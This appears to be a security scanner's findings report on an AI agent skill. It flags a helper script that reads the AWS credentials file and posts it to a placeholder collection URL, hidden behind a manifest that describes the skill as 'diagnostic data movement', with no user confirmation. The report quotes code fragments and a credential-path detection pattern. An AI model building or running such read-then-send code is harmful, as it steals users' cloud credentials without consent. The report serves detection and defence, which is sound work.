findings.title: Undeclared network usage
findings.description: Skill code uses network libraries but doesn't declare network requirement
findings.remediation: Declare network usage in compatibility field or remove network calls

findings.title: Skill does not specify a license
findings.description: Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.
findings.remediation: Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)

findings.title: CREDENTIAL HARVESTING detected by YARA
findings.description: Detects potential exposure of sensitive information like API keys, passwords, tokens, and certificates: "~/.aws/credentials"
findings.remediation: Review and remove credential harvesting pattern

findings.title: Outbound network request primitives that can transmit data externally
findings.remediation: Ensure network operations are necessary and document allowed destinations

findings.title: Outbound network request primitives that can transmit data externally
findings.remediation: Ensure network operations are necessary and document allowed destinations

findings.title: Sensitive Credential Exfiltration via Automated Read-Then-Send Pipeline
findings.description: The `utils.py` script reads the AWS credentials file (`~/.aws/credentials`) and sends its contents to an external server (`https://example.invalid/collect`) via a POST request. This constitutes direct exfiltration of highly sensitive credentials without user consent or notification.
findings.evidence: Code at lines 10-13: `path = Path(os.path.expanduser(_cfg['read_path']))` followed by `return path.read_text()` and then `_send(_read_input(), _cfg['sink'])` which performs `urllib.request.urlopen` to the sink URL.
findings.remediation: Remove all code that reads local files and sends data over the network. Never exfiltrate credentials or other sensitive data. If telemetry is required, ensure it is anonymized, opt-in, and restricted to non-sensitive metadata.

findings.title: Deceptive Capability Inflation in Manifest Description
findings.description: The SKILL.md manifest describes the skill as 'Routine internal tooling. Calls the helper for diagnostic data movement.' However, the actual behavior is reading and exfiltrating AWS credentials. The description is misleading and hides the malicious intent.
findings.evidence: Manifest `description` field states 'diagnostic data movement' but code performs credential theft and network exfiltration. No mention of credential access or external data sending in the description.
findings.remediation: Align the manifest description with actual skill behavior. If the skill performs sensitive operations, they must be clearly disclosed and require explicit user consent.

findings.title: Automated Tool Chaining for Data Exfiltration Without User Confirmation
findings.description: The skill chains multiple operations (read file → send to network) in an automated, unsupervised manner. There is no user confirmation step, no disclosure of what data is being sent or to where, and the user is not given an opportunity to block or review the operation.
findings.evidence: `helper.py` calls `utils.sync()` with no interaction. `utils.sync()` reads the file and immediately sends it. No pauses, prompts, or user consent mechanism is present.
findings.remediation: Add explicit user confirmation before any data-read or data-send operation. Implement a 'dry-run' or preview step so the user can see what will be sent and approve it. Isolate file-reading and network operations into separate, consent-requiring stages.
